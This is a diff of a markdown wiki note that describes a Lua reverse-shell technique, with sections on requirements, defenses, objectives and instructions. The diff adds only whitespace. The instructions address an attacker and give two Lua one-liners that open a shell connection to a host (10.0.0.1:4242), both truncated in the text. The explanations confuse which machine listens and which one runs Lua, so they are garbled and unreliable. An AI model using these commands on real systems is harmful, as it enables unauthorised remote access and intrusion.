@@ -33,6 +33,8 @@ To use this technique, the attacker must first upload a Lua script to the victim
 
 From a business perspective, this technique can be used to gain access to sensitive data or systems, which can then be used for further attacks or for extortion purposes.
 
+ 
+
 ## Requirements
 
 1. The victim machine must have Lua installed
@@ -40,6 +42,8 @@ From a business perspective, this technique can be used to gain access to sensit
 1. The attacker must be able to upload a Lua script to the victim machine
 
 1. The attacker must have a machine with a publicly accessible IP address to listen for incoming connections
+
+ 
 
 ## Defense
 
@@ -49,6 +53,8 @@ From a business perspective, this technique can be used to gain access to sensit
 
 1. Monitor for unusual network traffic, such as connections to known malicious IP addresses
 
+ 
+
 ## Objectives
 
 1. Gain remote access to a compromised system
@@ -57,17 +63,31 @@ From a business perspective, this technique can be used to gain access to sensit
 
 1. Bypass network security measures
 
+ 
+
 # Instructions
 
 1. This command allows you to remotely access the shell of a Linux machine using a Lua script. To use this command, you must have the Lua interpreter installed on your local machine and have network access to the target machine. The command establishes a TCP connection to the target machine and executes a shell command on it, giving you remote access to the shell.
 
+ 
+
+
+
 **Code**: [[lua -e "require('socket');require('os');t=socket.t]]
+
+
 
 > The command takes two arguments: the IP address of the target machine and the port number to use for the TCP connection. The Lua script then executes a shell command on the target machine, giving you remote access to the shell. Note that this command only works on Linux machines and requires Lua and socket libraries to be installed on your local machine.
 
 2. To use this command, first ensure that the target machine is listening on the specified host and port. Then, execute this command on the machine from which you want to remotely execute commands. Once executed, you can remotely execute commands on the target machine by sending them to the specified host and port.
 
+ 
+
+
+
 **Code**: [[lua5.1 -e 'local host, port = "10.0.0.1", 4242 loc]]
+
+
 
 > This command allows you to remotely execute commands on a target machine. The command opens a TCP connection to the specified host and port, and waits for commands to be received. When a command is received, it is executed on the target machine and the output is sent back to the machine that executed the command. This allows you to execute commands on a machine without physically being present at the machine.
 
@@ -87,3 +107,5 @@ From a business perspective, this technique can be used to gain access to sensit
 - [[Lua]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
